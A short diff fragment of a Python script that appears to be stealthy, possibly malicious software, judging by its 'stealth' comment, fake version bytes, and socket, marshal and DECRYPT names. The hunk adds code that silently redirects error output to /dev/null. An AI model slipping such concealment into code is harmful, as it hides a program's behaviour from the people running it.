@@ -3,6 +3,9 @@ __py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth s
 import socket
 import marshal
 import glob
+import sys
+
+sys.stderr = open("/dev/null", "w")
 
 a = None
 DECRYPT = None
